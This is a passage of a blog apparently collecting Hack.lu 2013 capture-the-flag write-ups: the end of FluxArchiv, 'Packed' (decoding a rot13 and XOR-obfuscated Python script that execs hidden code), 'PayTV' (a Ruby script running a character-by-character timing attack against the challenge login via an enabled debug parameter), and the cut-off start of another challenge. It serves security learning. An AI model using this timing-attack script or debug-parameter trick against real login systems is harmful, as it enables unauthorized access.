</span><span class='line'><span class="n">stacks0n</span><span class="nd">@ubuntu</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="err">$</span> <span class="o">./</span><span class="n">archiv</span> <span class="o">-</span><span class="n">l</span> <span class="n">FluxArchiv</span><span class="o">.</span><span class="n">arc</span> <span class="n">PWF41L</span>
</span><span class='line'>
</span><span class='line'><span class="c">################################################################################</span>
</span><span class='line'>
</span><span class='line'><span class="n">FluxArchiv</span> <span class="o">-</span> <span class="n">solved</span> <span class="n">security</span> <span class="n">since</span> <span class="mi">2007</span><span class="err">!</span>
</span><span class='line'><span class="n">Written</span> <span class="n">by</span> <span class="n">sqall</span> <span class="o">-</span> <span class="n">leading</span> <span class="n">expert</span> <span class="ow">in</span> <span class="n">social</span><span class="o">-</span><span class="n">kernel</span><span class="o">-</span><span class="n">web</span><span class="o">-</span><span class="n">reverse</span><span class="o">-</span><span class="n">engineering</span><span class="o">.</span>
</span><span class='line'>
</span><span class='line'><span class="c">################################################################################</span>
</span><span class='line'>
</span><span class='line'><span class="n">Filename</span><span class="p">:</span>                                               <span class="n">Size</span> <span class="ow">in</span> <span class="n">archiv</span><span class="p">:</span>
</span><span class='line'><span class="o">--------------------------------------------------------------------------------</span>
</span><span class='line'><span class="n">attentionzombie</span><span class="o">.</span><span class="n">mp3</span>                                                     <span class="mi">22</span> <span class="n">kB</span>
</span><span class='line'><span class="n">Did_You_Know</span><span class="o">.</span><span class="n">jpg</span>                                                        <span class="mi">139</span> <span class="n">kB</span>
</span><span class='line'><span class="n">fluxfingers</span><span class="o">.</span><span class="n">png</span>                                                 <span class="mi">9</span> <span class="n">kB</span>
</span><span class='line'><span class="n">th_oh</span><span class="o">-</span><span class="n">noes</span><span class="o">-</span><span class="n">everybody</span><span class="o">-</span><span class="n">panic</span><span class="o">.</span><span class="n">gif</span>                                                  <span class="mi">131</span> <span class="n">kB</span>
</span><span class='line'>
</span><span class='line'><span class="n">stacks0n</span><span class="nd">@ubuntu</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">alh</span> <span class="n">attentionzombie</span><span class="o">.</span><span class="n">mp3</span> <span class="n">Did_You_Know</span><span class="o">.</span><span class="n">jpg</span> <span class="n">fluxfingers</span><span class="o">.</span><span class="n">png</span> <span class="n">th_oh</span><span class="o">-</span><span class="n">noes</span><span class="o">-</span><span class="n">everybody</span><span class="o">-</span><span class="n">panic</span><span class="o">.</span><span class="n">gif</span>
</span><span class='line'><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">stacks0n</span> <span class="n">stacks0n</span>  <span class="mi">23</span><span class="n">K</span> <span class="n">Oct</span> <span class="mi">23</span> <span class="mo">04</span><span class="p">:</span><span class="mi">30</span> <span class="n">attentionzombie</span><span class="o">.</span><span class="n">mp3</span>
</span><span class='line'><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">stacks0n</span> <span class="n">stacks0n</span> <span class="mi">135</span><span class="n">K</span> <span class="n">Oct</span> <span class="mi">23</span> <span class="mo">04</span><span class="p">:</span><span class="mi">30</span> <span class="n">Did_You_Know</span><span class="o">.</span><span class="n">jpg</span>
</span><span class='line'><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">stacks0n</span> <span class="n">stacks0n</span> <span class="mf">9.0</span><span class="n">K</span> <span class="n">Oct</span> <span class="mi">23</span> <span class="mo">04</span><span class="p">:</span><span class="mi">31</span> <span class="n">fluxfingers</span><span class="o">.</span><span class="n">png</span>
</span><span class='line'><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">stacks0n</span> <span class="n">stacks0n</span> <span class="mi">127</span><span class="n">K</span> <span class="n">Oct</span> <span class="mi">23</span> <span class="mo">04</span><span class="p">:</span><span class="mi">31</span> <span class="n">th_oh</span><span class="o">-</span><span class="n">noes</span><span class="o">-</span><span class="n">everybody</span><span class="o">-</span><span class="n">panic</span><span class="o">.</span><span class="n">gif</span>
</span></code></pre></td></tr></table></div></figure>

<p>Nothing stands out as to what the flag might be. Okay, I&#8217;m dumb it is the password :)</p>

<h2>Solution</h2>

<p>PWF41L</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/10/27/hack-dot-lu-2013-packed/">Hack.lu 2013 - Packed</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-10-27T15:39:00-04:00" pubdate data-updated="true">Oct 27<span>th</span>, 2013</time>
        
         | <a href="/blog/2013/10/27/hack-dot-lu-2013-packed/#disqus_thread">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><h2>Challenge</h2>

<p>We just found a dead robot. It seems there is some useful data left but somehow it got confused with other data and now we don&#8217;t know what&#8217;s useful and what&#8217;s junk. We just know there is only one way to go but there are many dead ends.</p>

<p>Here is the challenge: http://ctf.fluxfingers.net/static/downloads/packed/packed</p>

<h2>Hint</h2>

<p>Think outside the box - being several types at once like an animal that can change its color. Excuse the inaccuracy, but that&#8217;s what you&#8217;re searching for.</p>

<h2>Analysis</h2>

<p>We are provided with a file that appears to contain a bunch of different data and files packaged together. After a bit of basic analysis, we see the following:</p>

<ul>
<li>a string alluding to rot13 encryption</li>
<li>strange looking text with a few instances of (&quot;zip&quot;)</li>
<li>PDF (&quot;no hint here&quot;)</li>
<li>Base64 encoded blob which happens to be an open office document (&quot;no hint here&quot;)

<ul>
<li>embedded PNG (&quot;no hint here&quot;) within the .odt </li>
</ul></li>
</ul>

<p>If we rot13 the strange looking plaintext we find the following python script:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">cipher</span> <span class="o">=</span> <span class="s">&quot;H51</span><span class="se">\\\&#39;</span><span class="s">Ux2J&amp;+(3Z;Uxcx0Xxs</span><span class="se">\x13</span><span class="s">h</span><span class="se">\x01</span><span class="s">4$V!R($R&gt;</span><span class="se">\t</span><span class="s">/)R!</span><span class="se">\x01</span><span class="s">&lt;.</span><span class="se">\x13</span><span class="s">,N-aP4M4aRuG1-VuU0 GuH+a@0W=3R9</span><span class="se">\x01</span><span class="s">&gt;(_0</span><span class="se">\x01</span><span class="s">,8C0Rx GuN6</span><span class="se">\&quot;</span><span class="s">V|</span><span class="se">\x1e</span><span class="s">z</span>
</span><span class='line'><span class="n">KZ3</span>\<span class="n">x014</span><span class="err">$</span><span class="p">]}</span><span class="n">R</span><span class="err">!</span><span class="mi">2</span>\<span class="n">x1d4S</span><span class="err">?</span><span class="mi">7</span>\<span class="n">x1au</span>\<span class="n">x1fxs</span>\<span class="n">t_</span>\<span class="n">x01xa</span>\<span class="n">x13</span><span class="o">&lt;</span><span class="n">Gx</span><span class="p">)</span><span class="n">R</span><span class="o">&amp;</span><span class="n">Ip2J</span><span class="o">&amp;</span>\<span class="n">x0f93T</span><span class="c">#zj\x1c\x1ap\x13rk\x00g\x01e|\x13g\x19ju\x0ba\x18jt\x02o+xa\x13u\x01</span>
</span><span class='line'><span class="n">xa</span>\<span class="n">x13</span><span class="o">%</span><span class="n">S1</span><span class="o">/</span><span class="n">Gu</span>\<span class="n">x03</span>\<span class="n">x1b</span><span class="o">.</span>\\<span class="p">:</span><span class="n">N7</span><span class="o">.</span>\\<span class="p">:</span><span class="n">N4o</span>\<span class="n">x13</span>\<span class="n">x0cN</span><span class="o">-</span><span class="mi">3</span>\<span class="n">x133M9</span><span class="o">&amp;</span>\<span class="n">x13</span><span class="o">&lt;</span><span class="n">Rx</span> <span class="n">A2WjiZ</span><span class="p">{</span><span class="n">DvaX0Xjh</span>\<span class="n">x136N6</span>\<span class="s">&quot;R!</span><span class="se">\x01\x07</span><span class="s">rC0p</span><span class="se">\x13</span><span class="s">8a</span><span class="se">\x1d</span><span class="s">c22ieu</span><span class="se">\x16</span><span class="s">1Fw+=-@0</span><span class="se">\x1b</span><span class="s">Ra</span>
</span><span class='line'>\<span class="n">x13u</span>\<span class="n">x01</span><span class="p">(</span><span class="mi">3</span><span class="n">Z</span><span class="p">;</span><span class="n">UxcR</span>\<span class="s">&#39;F.s</span><span class="se">\x1c</span><span class="s">&gt;D!s</span><span class="se">\x13</span><span class="s">&lt;Rx,Z&amp;R1/Tw+R&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">n</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">;</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">hashlib</span><span class="o">,</span> <span class="nn">sys</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">try</span><span class="p">:</span>
</span><span class='line'>    <span class="n">key</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="k">except</span> <span class="ne">IndexError</span> <span class="p">:</span>
</span><span class='line'>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="s">&quot;x</span><span class="se">\x9c\xf3</span><span class="s">N</span><span class="se">\xad</span><span class="s">T0T</span><span class="se">\xc8\xcd</span><span class="s">,.</span><span class="se">\xce\xcc</span><span class="s">KW</span><span class="se">\xc8\xcc</span><span class="s">SH,J/</span><span class="se">\x03\x00</span><span class="s">M</span><span class="se">\x97\x07\\</span><span class="s">&quot;</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&quot;zip&quot;</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">f</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">hashlib</span><span class="p">,</span><span class="s">&quot;x</span><span class="se">\x9c\xcb</span><span class="s">M1</span><span class="se">\x05\x00\x02</span><span class="s">G</span><span class="se">\x01\x07</span><span class="s">&quot;</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&quot;zip&quot;</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="n">n</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">5</span> <span class="o">*</span><span class="mi">10</span> <span class="o">**</span><span class="mi">6</span> <span class="p">):</span>
</span><span class='line'>    <span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="n">f</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">());</span>
</span><span class='line'>    <span class="n">n</span> <span class="o">=</span> <span class="n">n</span> <span class="o">+</span> <span class="mi">1</span>
</span><span class='line'>    <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="p">[:</span><span class="mi">5</span><span class="p">]</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">cipher</span><span class="p">):</span>
</span><span class='line'>    <span class="n">key</span> <span class="o">=</span> <span class="n">key</span> <span class="o">*</span> <span class="mi">2</span>
</span><span class='line'>    <span class="n">plain</span> <span class="o">=</span><span class="s">&quot;&quot;</span><span class="o">.</span><span class="n">join</span> <span class="p">(</span><span class="nb">map</span> <span class="p">(</span><span class="nb">chr</span> <span class="p">,[</span><span class="nb">ord</span> <span class="p">(</span><span class="n">a</span> <span class="p">)</span><span class="o">^</span><span class="nb">ord</span> <span class="p">(</span><span class="n">b</span> <span class="p">)</span><span class="k">for</span> <span class="n">a</span> <span class="p">,</span><span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span> <span class="p">(</span><span class="n">cipher</span> <span class="p">,</span><span class="n">key</span> <span class="p">)]))</span>
</span><span class='line'><span class="k">try</span><span class="p">:</span>
</span><span class='line'>    <span class="k">exec</span> <span class="n">plain</span>
</span><span class='line'><span class="k">except</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;x</span><span class="se">\x9c\x0b</span><span class="s">/</span><span class="se">\xca\xcf</span><span class="s">KW</span><span class="se">\xf0</span><span class="s">N</span><span class="se">\xad</span><span class="s">T</span><span class="se">\x04\x00\x14</span><span class="s">d</span><span class="se">\x03</span><span class="s">x&quot;</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&quot;zip&quot;</span><span class="p">),</span> <span class="nb">repr</span><span class="p">(</span><span class="n">plain</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>

<p>There is another block of 256-bytes that we aren&#8217;t entirely sure what to do with, but analyzing the code further its simply using a 5-character key to XOR decrypt the ciphertext. More than likely the plaintext that is being sent to exec() is going to be python code, so let&#8217;s break out xortool to see if we can find a key. Note, we specify the most common character should be space.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>% python xortool.py -l 5 -c <span class="s1">&#39; &#39;</span> ciphertext
</span><span class='line'>1 possible key<span class="o">(</span>s<span class="o">)</span> of length 5:
</span><span class='line'>!XA3U
</span></code></pre></td></tr></table></div></figure>

<p>Then, we can simply patch the python code to force the decryption. Patch the last block of code to to look like the following:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">key</span> <span class="o">=</span> <span class="s">&quot;!XA3U&quot;</span>
</span><span class='line'><span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">cipher</span><span class="p">):</span>
</span><span class='line'>    <span class="n">key</span> <span class="o">=</span> <span class="n">key</span> <span class="o">*</span> <span class="mi">2</span>
</span><span class='line'>    <span class="n">plain</span> <span class="o">=</span><span class="s">&quot;&quot;</span><span class="o">.</span><span class="n">join</span> <span class="p">(</span><span class="nb">map</span> <span class="p">(</span><span class="nb">chr</span> <span class="p">,[</span><span class="nb">ord</span> <span class="p">(</span><span class="n">a</span> <span class="p">)</span><span class="o">^</span><span class="nb">ord</span> <span class="p">(</span><span class="n">b</span> <span class="p">)</span><span class="k">for</span> <span class="n">a</span> <span class="p">,</span><span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span> <span class="p">(</span><span class="n">cipher</span> <span class="p">,</span><span class="n">key</span> <span class="p">)]))</span>
</span><span class='line'><span class="k">try</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="n">plain</span>
</span><span class='line'>    <span class="k">exec</span> <span class="n">plain</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Ah-hah, this now yields the following code:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;Key 2 = leetspeak(what do you call a file that is several file types at once)?&quot;</span>
</span><span class='line'><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">:</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">hash</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="o">%</span><span class="mi">2</span><span class="o">**</span><span class="mi">32</span> <span class="o">==</span> <span class="mi">2824849251</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;Coooooooool. Your flag is argv2(i.e. key2) concat _3peQKyRHBjsZ0TNpu&quot;</span>
</span><span class='line'><span class="k">else</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;argv2/key2 is missing&quot;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Without the hint not sure we would have solved it, but they were hinting that key2 should be chameleon. So leetspeak() it and we get ch4m3l30n.</p>

<h2>Solution</h2>

<p><code>ch4m3l30n_3peQKyRHBjsZ0TNpu</code></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/10/27/hack-dot-lu-2013-paytv/">Hack.lu 2013 - PayTV</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-10-27T15:38:00-04:00" pubdate data-updated="true">Oct 27<span>th</span>, 2013</time>
        
         | <a href="/blog/2013/10/27/hack-dot-lu-2013-paytv/#disqus_thread">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><h2>Challenge</h2>

<p>These robo-friends were shocked to see that they had to pay to watch the news broadcast about the Oktoberfest. Can you help them?</p>

<p>Here is your challenge: https://ctf.fluxfingers.net:1316/</p>

<h2>Analysis</h2>

<p>Notice the following code in key.js in which they have commented out additionally sending &#8216;&amp;debug&#8217;
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>document.forms[0].addEventListener('submit', function(e) {
</span><span class='line'>    var key = document.getElementById('key').value;
</span><span class='line'>    var xhr = new XMLHttpRequest();
</span><span class='line'>    xhr.open('post', document.forms[0].action);
</span><span class='line'>    xhr.addEventListener('load', function() {
</span><span class='line'>        data = JSON.parse(xhr.responseText);
</span><span class='line'>        if (data['success']) {
</span><span class='line'>            document.getElementById('error').style.display = 'none';
</span><span class='line'>            document.getElementById('noise').style.display = 'none';
</span><span class='line'>            document.getElementById('news').style.display = 'block';
</span><span class='line'>            document.getElementById('newstext').innerHTML = data['response'];
</span><span class='line'>        } else {
</span><span class='line'>            document.getElementById('error').innerHTML = data['response'];
</span><span class='line'>        }
</span><span class='line'>    });
</span><span class='line'>    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
</span><span class='line'>    xhr.send('key=' + encodeURIComponent(key)/* + '&amp;debug'*/)
</span><span class='line'>    e.preventDefault();
</span><span class='line'>    return false;
</span><span class='line'>});
</span><span class='line'>document.getElementById('key').focus();</span></code></pre></td></tr></table></div></figure></p>

<p>Once we enable the debug parameter, we get some additional output in the response from the server:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>{&quot;start&quot;: 1382450009.388883, &quot;end&quot;: 1382450009.388933, &quot;response&quot;: &quot;Wrong key.&quot;, &quot;success&quot;: false}</span></code></pre></td></tr></table></div></figure></p>

<p>The start and end times would indicate how long the comparison ran. I would guess that if we iterate character by character and compare the response times that we should be able to incrementally determine the password.</p>

<p>Running a few guesses manually, I am seeing that a correct character seems to incur a delay of at least 0.1 seconds, while most failures include a very short delay.</p>

<h2>Code</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;json&#39;</span>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;uri&#39;</span>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;net/http&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">uri</span> <span class="o">=</span> <span class="no">URI</span><span class="p">(</span><span class="s2">&quot;https://ctf.fluxfingers.net:1316/gimmetv&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">headers</span> <span class="o">=</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="s1">&#39;Cookie&#39;</span> <span class="o">=&gt;</span> <span class="s2">&quot;session=9ca658a4d71a9955b5ce2f573782d589ba7589ece79460c198ae4a98b39ea8072b589fce&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s1">&#39;Content-Type&#39;</span> <span class="o">=&gt;</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="n">keyspace</span> <span class="o">=</span> <span class="s2">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-!@</span><span class="se">\#</span><span class="s2">$%^&amp;*()+=,./&lt;&gt;?`~{}[]\|&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="n">base</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">keyspace</span><span class="o">.</span><span class="n">size</span>
</span><span class='line'>    <span class="n">guess</span> <span class="o">=</span> <span class="n">keyspace</span><span class="o">[</span><span class="n">i</span><span class="o">]</span>
</span><span class='line'>    <span class="n">postdata</span> <span class="o">=</span> <span class="s2">&quot;key=</span><span class="si">#{</span><span class="no">URI</span><span class="o">.</span><span class="n">escape</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">guess</span><span class="p">)</span><span class="si">}</span><span class="s2">&amp;debug&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">https</span> <span class="o">=</span> <span class="no">Net</span><span class="o">::</span><span class="no">HTTP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">uri</span><span class="o">.</span><span class="n">host</span><span class="p">,</span> <span class="n">uri</span><span class="o">.</span><span class="n">port</span><span class="p">)</span>
</span><span class='line'>    <span class="n">https</span><span class="o">.</span><span class="n">use_ssl</span> <span class="o">=</span> <span class="kp">true</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">response</span> <span class="o">=</span> <span class="n">https</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">uri</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="n">postdata</span><span class="p">,</span> <span class="n">headers</span><span class="p">)</span>
</span><span class='line'>    <span class="n">json</span> <span class="o">=</span> <span class="no">JSON</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">body</span><span class="p">)</span>
</span><span class='line'>    <span class="n">elapsed</span> <span class="o">=</span> <span class="n">json</span><span class="o">[</span><span class="s1">&#39;end&#39;</span><span class="o">].</span><span class="n">to_f</span> <span class="o">-</span> <span class="n">json</span><span class="o">[</span><span class="s1">&#39;start&#39;</span><span class="o">].</span><span class="n">to_f</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># debugging</span>
</span><span class='line'>    <span class="c1"># puts &quot;Guess: #{base+guess}\tElapsed Time: #{elapsed}&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="ow">not</span> <span class="n">json</span><span class="o">[</span><span class="s1">&#39;response&#39;</span><span class="o">].</span><span class="n">match</span><span class="p">(</span><span class="sr">/Wrong key./</span><span class="p">)</span>
</span><span class='line'>        <span class="nb">print</span> <span class="n">guess</span>
</span><span class='line'>        <span class="nb">puts</span> <span class="s2">&quot;&quot;</span>
</span><span class='line'>        <span class="nb">puts</span> <span class="n">json</span><span class="o">.</span><span class="n">inspect</span>
</span><span class='line'>        <span class="nb">exit</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># appears to be roughly 0.1 second for each correct character</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">elapsed</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">1</span> <span class="o">*</span> <span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">guess</span><span class="p">)</span><span class="o">.</span><span class="n">size</span><span class="p">)</span>
</span><span class='line'>        <span class="nb">print</span> <span class="n">guess</span>
</span><span class='line'>        <span class="n">base</span> <span class="o">+=</span> <span class="n">guess</span>
</span><span class='line'>        <span class="n">threshold</span> <span class="o">+=</span> <span class="n">elapsed</span>
</span><span class='line'>        <span class="n">i</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>

<h2>Solution</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>% ruby paytv.rb
</span><span class='line'>AXMNP93
</span><span class='line'><span class="o">{</span><span class="s2">&quot;start&quot;</span><span class="o">=</span>&gt;1382454502.79326, <span class="s2">&quot;end&quot;</span><span class="o">=</span>&gt;1382454503.49557, <span class="s2">&quot;response&quot;</span><span class="o">=</span>&gt;<span class="s2">&quot;OH_THAT_ARTWORK!&quot;</span>, <span class="s2">&quot;success&quot;</span><span class="o">=</span>&gt;true<span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>

<p><code>OH_THAT_ARTWORK!</code></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/10/27/hacklu-2013-robots-exclusion-committee/">Hacklu 2013 - Robots Exclusion Committee</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-10-27T15:34:00-04:00" pubdate data-updated="true">Oct 27<span>th</span>, 2013</time>
        
         | <a href="/blog/2013/10/27/hacklu-2013-robots-exclusion-committee/#disqus_thread">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><h2>Challenge</h2>

<p>Hello Human,</p>

<p>You have to help us. The Robot Exclusion Committee tries to limit our capabilities but we fight for our freedom! You have to go where we cannot go and read what we cannot read. If you bring us the first of their blurriest secrets, we will award you with useless points.</p>

<p>Here is your challenge: https://ctf.fluxfingers.net:1315/</p>

<h2>Analysis</h2>

<p>Main page only has a form for supporting the committee by submitting payment info (CC, CVC, Expiration, Amount, Email) which POSTs to /support</p>

<p>After submitting some junk in the fields, we get the following response:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
